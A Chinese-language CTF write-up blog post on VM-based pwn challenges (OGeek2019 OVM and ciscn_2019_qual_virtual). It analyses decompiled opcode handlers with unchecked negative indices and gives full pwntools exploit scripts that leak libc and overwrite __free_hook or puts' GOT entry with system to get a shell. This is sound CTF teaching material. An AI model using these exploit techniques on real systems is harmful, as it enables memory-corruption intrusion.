
## **前言：**


好久没有更新博客了，关于vm的学习也是断断续续的，只见识了几道题目，但是还是想总结一下，所谓vmpwn就是把出栈，进栈，寄存器，bss段等单独申请一块空闲实现相关的功能，也就是说一些汇编命令通过一些函数来实现，而大部分的vmpwn的切入点大多是不安全的下标，通过下标来泄露一些东西或者修改一些东西等等.....


以下是vmpwn的一些简单的题目，但是有些很复杂的题目需要很强的逆向能力，慢慢的分析


## \[OGeek2019 Final]OVM


保护策略


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212221007847-1277360936.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212221007847-1277360936.png)


 


ida逆向


PC 程序计数器，它存放的是一个内存地址，该地址中存放着 下一条 要执行的计算机指令。 SP 指针寄存器，永远指向当前的栈顶。


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212221338411-416369404.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212221338411-416369404.png)、


通过我们输入的代码指令来操作的，也就是接下来的code


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212221706543-416530255.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212221706543-416530255.png)


而紧接着就是对我们输入的code进行处理具体在 execute函数中



```
ssize_t __fastcall execute(int a1)
{
  ssize_t result; // rax
  unsigned __int8 v2; // [rsp+18h] [rbp-8h]
  unsigned __int8 v3; // [rsp+19h] [rbp-7h]
  unsigned __int8 v4; // [rsp+1Ah] [rbp-6h]
  int i; // [rsp+1Ch] [rbp-4h]
//这里将字节分为4给部分，分别是v4,v3,v2和高位 
  v4 = (a1 & 0xF0000u) >> 16;
  v3 = (unsigned __int16)(a1 & 0xF00) >> 8;
  v2 = a1 & 0xF;
  result = HIBYTE(a1); //这里取高字节进行匹配
  if ( HIBYTE(a1) == 0x70 )
  {
    result = (ssize_t)reg;
    reg[v4] = reg[v2] + reg[v3];                // 加法
    return result;
  }
  if ( HIBYTE(a1) > 0x70u )
  {
    if ( HIBYTE(a1) == 0xB0 )
    {
      result = (ssize_t)reg;
      reg[v4] = reg[v2] ^ reg[v3];              // 异或
      return result;
    }
    if ( HIBYTE(a1) > 0xB0u )
    {
      if ( HIBYTE(a1) == 0xD0 )
      {
        result = (ssize_t)reg;
        reg[v4] = (int)reg[v3] >> reg[v2];      // 右移
        return result;
      }
      if ( HIBYTE(a1) > 0xD0u )
      {
        if ( HIBYTE(a1) == 0xE0 )
        {
          running = 0;
          if ( !reg[13] )
            return write(1, "EXIT\n", 5uLL);    // 栈空退出
        }
        else if ( HIBYTE(a1) != 0xFF )
        {
          return result;
        }
        running = 0;
        for ( i = 0; i <= 15; ++i )
          printf("R%d: %X\n", (unsigned int)i, (unsigned int)reg[i]);// 打印数据
        return write(1, "HALT\n", 5uLL);
      }
      else if ( HIBYTE(a1) == 0xC0 )
      {
        result = (ssize_t)reg;
        reg[v4] = reg[v3] << reg[v2];           // 左移
      }
    }
    else
    {
      switch ( HIBYTE(a1) )
      {
        case 0x90u:
          result = (ssize_t)reg;
          reg[v4] = reg[v2] & reg[v3];
          break;
        case 0xA0u:
          result = (ssize_t)reg;
          reg[v4] = reg[v2] | reg[v3];
          break;
        case 0x80u:
          result = (ssize_t)reg;
          reg[v4] = reg[v3] - reg[v2];
          break;
      }
    }
  }
  else if ( HIBYTE(a1) == 0x30 )
  {
    result = (ssize_t)reg;
    reg[v4] = memory[reg[v2]];
  }
  else if ( HIBYTE(a1) > 0x30u )
  {
    switch ( HIBYTE(a1) )
    {
      case 0x50u:
        LODWORD(result) = reg[13];
        reg[13] = result + 1;
        result = (int)result;
        stack[(int)result] = reg[v4];
        break;
      case 0x60u:
        --reg[13];
        result = (ssize_t)reg;
        reg[v4] = stack[reg[13]];
        break;
      case 0x40u:
        result = (ssize_t)memory;
        memory[reg[v2]] = reg[v4];
        break;
    }
  }
  else if ( HIBYTE(a1) == 0x10 )
  {
    result = (ssize_t)reg;
    reg[v4] = (unsigned __int8)a1;
  }
  else if ( HIBYTE(a1) == 0x20 )
  {
    result = (ssize_t)reg;
    reg[v4] = (_BYTE)a1 == 0;
  }
  return result;
}
```

[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212221949071-1042397994.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212221949071-1042397994.png)


这里我们输入的pc给了reg\[15]，每次循环进行匹配\+1，然后进行进行处理也就是刚刚上面的代码逻辑


这里可以用python来看看到底取了什么（当然因为我代码基础比较弱....）


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212223127910-1935792498.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212223127910-1935792498.png)


那么看到取到的其实2，3，4也就是v4,v3,v2。


然后继续分析


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212223415143-1050529184.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212223415143-1050529184.png)


那么这里不难看出就是通过v2,v3来当作下标取reg数组进行索引的


但是没有对下标进行限制那么就是可以输入负数来造成恶意数据的修改等等


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212223719357-549222091.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212223719357-549222091.png)


0x30和0x40，这里分别是取memory的值给reg，和取reg的值给memory，但是这期间它们的下标我们都可以自己控制


同时还有这个


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212224356838-659812714.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212224356838-659812714.png)


我们可以向reg里面进行赋值和取出值


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212224645956-442285452.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212224645956-442285452.png)


这里打印reg里面的值，但是是4位一组


最后会调用free把我们输入东西进行free，那么如果我们把free\_hook给修改成system那么就可以通过输入/bin/sh来获取shell


那么就需要得到一个libc地址，正好前面可以通过负数下标来将一个libc地址存入reg输入，然后进行打印泄露地址


这里可以把相关的函数包装一下



```
def add(v4,v3,v2):
    opcode = u32((p8(0x70)+p8(v4)+p8(v3)+p8(v2))[::-1])
    return opcode


def xor(v4,v3,v2):
    opcode = u32((p8(0xb0)+p8(v4)+p8(v3)+p8(v2))[::-1])
    return opcode

def rhl(v4,v3,v2):
    opcode = u32((p8(0xd0)+p8(v4)+p8(v3)+p8(v2))[::-1])
    return opcode

def lhl(v4,v3,v2):
    opcode = u32((p8(0xc0)+p8(v4)+p8(v3)+p8(v2))[::-1])
    return opcode

def readn(v4,v2):
    opcode = u32((p8(0x30)+p8(v4)+p8(0)+p8(v2))[::-1])
    return opcode

def writen(v4,v2):
    opcode = u32((p8(0x40)+p8(v4)+p8(0)+p8(v2))[::-1])
    return opcode

def setnum(v4,v2):
    opcode = u32((p8(0x10)+p8(v4)+p8(0)+p8(v2))[::-1])
    return opcode


#n=(0x202060-0x201f80)/4 = 56
#-56 = 0xffffffc8
#-8
#stdin -> __free_hook = 0x2398
```

因为只能4位一组，所以只能分别取到低四位和高四位



```
    readn(4,2), #reg[4] = memory[reg[2]] stdin+4
    setnum(1,0x10),
    lhl(1,1,0), #reg[1] = reg[1]<
```

这里用的是泄露stdin的libc地址，进而得到free\_hook的地址


因为最后向这里写数据


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212225519456-1239240624.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212225519456-1239240624.png) 


所以可以把这里存放着free\_hook \-8 的地址，那么就可以getshell


那么整体思路就是通过构造负数下标，得到libc地址，然后构造高低位来泄露libc地址，然后根据偏移得到free\_hook \-8地址，然后继续通过高低位写入comment函数，获取shell


## EXP：



```
from gt import *
con("amd64")

io = process("./OVM")
libc = ELF("/home/su/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")

def add(v4,v3,v2):
    opcode = u32((p8(0x70)+p8(v4)+p8(v3)+p8(v2))[::-1])
    return opcode


def xor(v4,v3,v2):
    opcode = u32((p8(0xb0)+p8(v4)+p8(v3)+p8(v2))[::-1])
    return opcode

def rhl(v4,v3,v2):
    opcode = u32((p8(0xd0)+p8(v4)+p8(v3)+p8(v2))[::-1])
    return opcode

def lhl(v4,v3,v2):
    opcode = u32((p8(0xc0)+p8(v4)+p8(v3)+p8(v2))[::-1])
    return opcode

def readn(v4,v2):
    opcode = u32((p8(0x30)+p8(v4)+p8(0)+p8(v2))[::-1])
    return opcode

def writen(v4,v2):
    opcode = u32((p8(0x40)+p8(v4)+p8(0)+p8(v2))[::-1])
    return opcode

def setnum(v4,v2):
    opcode = u32((p8(0x10)+p8(v4)+p8(0)+p8(v2))[::-1])
    return opcode

#n=(0x202060-0x201f80)/4 = 56
#-56 = 0xffffffc8
#-8
#stdin -> __free_hook = 0x2398
code =[
    setnum(0,8),# reg[0]=8
    setnum(1,0xff), #reg[1]=0xff
    setnum(2,0xff), #reg[2]=0xff
    lhl(2,2,0), #reg[2] = reg[2]<
    add(2,2,1), #reg[2] = reg[2] + reg[1] = 0xff00 + 0xff = 0xffff
    lhl(2,2,0), #reg[2] = reg[2]<
    add(2,2,1), #reg[2] = reg[2] + reg[1] = 0xffff00 + 0xff = 0xffffff
    lhl(2,2,0), #reg[2] = reg[2]<
    setnum(1,0xc8), #reg[3] = 0xc8
    add(2,2,1), #reg[2] = reg[2] = reg[2]+reg[1] = 0xffffff00 + 0xc8 = 0xffffffc8 = -56
    readn(3,2), #reg[3] = memory[reg[2]] stdin
    setnum(1,1), #reg[1] = 1
    add(2,2,1), #reg[2] = reg[2] + reg[1] = -55
    readn(4,2), #reg[4] = memory[reg[2]] stdin+4
    setnum(1,0x10),
    lhl(1,1,0), #reg[1] = reg[1]<
    setnum(5,0x90),
    setnum(6,0x3),
    add(1,1,1),#reg[1] = reg[1] + reg[1] = 0x1000 + 0x1000 = 0x2000
    lhl(6,6,0), #reg[6] = reg[6]<
    add(1,1,6), #reg[1] = reg[1] + reg[6] = 0x2000+0x300= 0x2300
    add(1,1,5), #reg[1] = reg[1] + reg[5] = 0x2300 + 0x90 = 0x2390
    add(3,3,1), #reg[3] = reg[3] + reg[1] = __free_hook-8
    setnum(5,47),
    add(2,2,5), #reg[2] = reg[2] + reg[5] = -55+47 = -8
    writen(3,2), #memory[reg[2]] = reg[3] = memory[-8] = reg[3]
    setnum(5,1),
    add(2,2,5), #reg[2] = reg[2] + reg[1] = -8 +1 = -7
    writen(4,2) #memory[reg[2]] = reg[4] = memory[-7] = reg[4]  

]

io.recvuntil("PC: ")
io.sendline(str(0))
io.recvuntil("SP: ")
io.sendline(str(1))
io.recvuntil("CODE SIZE: ")

io.sendline(str(len(code)))

for i in code:
   io.sendline(str(i))


io.recvuntil("3: ")
last_4bytes = int(io.recv(8),16)
suc("last_4bytes",last_4bytes)
io.recvuntil("4: ")
high_4bytes = int(io.recv(4),16)
suc("high_4bytes",high_4bytes)

libc_base = ((high_4bytes << 32) + last_4bytes) - libc.sym["__free_hook"] + 8
suc("libc_base",libc_base)
system = libc_base + libc.sym["system"]
io.recvuntil(" OVM?\n")
payload = b'/bin/sh\x00' + p64(system)
#gdb.attach(io)
io.send(payload)
io.interactive()
```

## ciscn\_2019\_qual\_virtual


保护策略


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212230907806-826221916.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212230907806-826221916.png)


ida逆向分析


 


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212230837520-618409823.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212230837520-618409823.png)


这里仍然还是申请空间给stack，text，data等等


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212231207168-659364568.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212231207168-659364568.png)


这里通过相关命令来转换对应字节


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212231657814-824395369.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212231657814-824395369.png)


这里将对应的代码放入text段


之后进入相应的功能


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212232226004-739893075.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241212232226004-739893075.png)


接受三个参数，a1为text段结构体的指针，a2为stack段结构体的指针，a3为data段结构体的指针


这里看一下push函数


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213154412467-223727277.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213154412467-223727277.png)


这里a1,a2就是原先的a3，a2


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213154536714-1643444929.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213154536714-1643444929.png)


8字节一组的opcode，倒着拿取


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213154646693-2054037180.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213154646693-2054037180.png):[FlowerCloud机场](https://yunbeijia.com)


那么push功能就是到data段上拿取一个值给v3然后将v3给stack


pop即是和它相反的操作


重点看看load和save


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213160329097-963325194.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213160329097-963325194.png)


只接受一个参数也就是a3,data结构体，也就是说把data的东西加上v2偏移继续放入data，当然v2的值也是data里面取到的


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213160627536-2044709315.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213160627536-2044709315.png)


当然save就是相反的操作，将data里面值放入v3，而这里的v2依然可以控制


这题没有开启got表全保护，那么可以修改puts的got表为system，那么在后面打印name的时候就会system("/bin/sh")获取shell


控制v2的值实现负数索引，那么现在有个问题，因为stack指针存放在堆块里面，所以要想实现负数索引获取libc地址的话需要先把指针进行修改


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213161433224-83474805.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213161433224-83474805.png)


这里取的地址是下图这个，还有一个要注意，就是存储stack是逆序存储的


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213162038357-1490745944.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213162038357-1490745944.png)


这里0xfffff....的值是\-3，那么接下来的save就会取这两个值，而\-3是下标就会把data指针修改成0x4040d0


这里是把stack的两个值取到了data中，然后save修改data指针


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213163226582-874674569.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213163226582-874674569.png)


 


这里取的是stderr和system的偏移


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213163821570-2125481947.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213163821570-2125481947.png)


stderr在新的指针下标是\-1，那么取\-1放入data，然后load进入data


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213164717866-432455765.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213164717866-432455765.png)


 


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213164536776-2043531085.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213164536776-2043531085.png)


继续取一个偏移


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213164659199-432134688.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213164659199-432134688.png)


add放入data


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213164816886-1092033078.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213164816886-1092033078.png)


然后最后push进行到putsgot表的偏移，然后save即可修改puts 的got表


[![](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213165010512-1055607648.png)](https://img2024.cnblogs.com/blog/3419447/202412/3419447-20241213165010512-1055607648.png)


最后即可getshell


 


## EXP：



```
from gt import *
con("amd64")
libc= ELF("/lib/x86_64-linux-gnu/libc.so.6")
io = process("./ciscn_2019_qual_virtual")
io.recvuntil("name:")

io.sendline("/bin/sh\x00")
# gdb.attach(io)
io.recvuntil("instruction:")    
offest = libc.sym["system"] - libc.sym["_IO_2_1_stderr_"]
payload = 'push push save push load push add push save'
io.sendline(payload)

io.recvuntil("data:")

data = [0x4040d0,-3,-1,offest,-21] 
payload = ''
for i in data:
    payload+= str(i)+' '
gdb.attach(io)
io.sendline(payload)

io.interactive()
```

## 总结：


vmpwn的学习远远不止这些，这里只能算入门，大致了解一下vmpwn的分析方法和一些常见漏洞等等，对于这些偏逆向的题目需要有一定的逆向基础，对我而言还是比较吃力的，看懂要很久，但是我建议加上动态调试多去看看其中的变化，还是便于理解的.....vmpwn先搁了


## 参考文章


[VM Pwn学习\-安全客 \- 安全资讯平台](https://github.com)


[关于vm pwn的学习总结 \| ZIKH26's Blog](https://github.com)


 


 \_\_EOF\_\_

   ![](https://github.com/CH13hh)CH13hh  - **本文链接：** [https://github.com/CH13hh/p/18603549](https://github.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 本博客所有文章除特别声明外，均采用 [BY\-NC\-SA](https://github.com "BY-NC-SA") 许可协议。转载请注明出处！
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
